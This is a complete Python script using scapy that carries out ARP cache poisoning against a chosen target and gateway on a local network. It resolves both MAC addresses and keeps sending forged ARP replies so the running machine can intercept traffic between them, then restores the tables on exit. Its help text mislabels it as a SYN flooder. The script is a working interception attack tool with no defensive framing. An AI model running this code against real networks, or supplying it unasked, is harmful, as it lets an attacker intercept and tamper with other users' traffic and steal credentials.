#!/usr/bin/env python
from argparse import ArgumentParser, Namespace
from scapy.all import ARP, Ether, send, srp
import sys
import time


def parse_arguments() -> Namespace:
    parser = ArgumentParser(description="Floods target IP with SYN packets")
    parser.add_argument("-t", "--target-ip", dest="target_ip", type=str, required=True)
    parser.add_argument("-g", "--gateway-ip", dest="gateway_ip", type=str, required=True)
    parser.add_argument("-i", "--interface", dest="interface", type=str, required=True)

    return parser.parse_args()


def get_mac(ip: str) -> str | None:
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=ip)
    response, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in response:
        return r[Ether].src
    
    return None
    

def restore(gateway_ip: str,
            gateway_mac: str,
            target_ip: str,
            target_mac: str):
    

    print('Restoring ARP tables...')
    send(ARP(
            op=2,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
            pdst=target_ip,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5,
            verbose=False)
    send(ARP(
            op=2,
            psrc=target_ip,
            hwsrc=target_mac,
            pdst=gateway_ip,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5, 
            verbose=False)
    

def poison(gateway_ip: str, 
           gateway_mac: str, 
           target_ip: str, 
           target_mac: str): 
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    print(poison_target.summary())

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    print(poison_gateway.summary())

    print("Starting ARP poison... Press CTRL-C to stop.")
    while True:
            send(poison_target, verbose=False)
            send(poison_gateway, verbose=False)
            time.sleep(2)


def main():
    args = parse_arguments()
    print(f"Target is {args.target_ip}")
    print(f"Gateway is {args.gateway_ip}")
    print(f"Interface is {args.interface}")

    print(f"Resolving MAC for IP {args.gateway_ip}...")
    gateway_mac = get_mac(args.gateway_ip)

    print(f"Resolving MAC for IP {args.target_ip}...")
    target_mac = get_mac(args.target_ip)

    if not gateway_mac:
        print("Gateway MAC not resolved!")
        sys.exit(1)
    if not target_mac:
        print("Target MAC not resolved!")
        sys.exit(1)
    
    print(f"Gateway MAC address is {gateway_mac}")
    print(f"Target MAC address is {target_mac}")

    try:
        poison(args.gateway_ip,
               gateway_mac,
               args.target_ip,
               target_mac)
    except KeyboardInterrupt:
        restore(args.gateway_ip,
               gateway_mac,
               args.target_ip,
               target_mac)
        sys.exit(0)


if __name__ == "__main__":
    main()
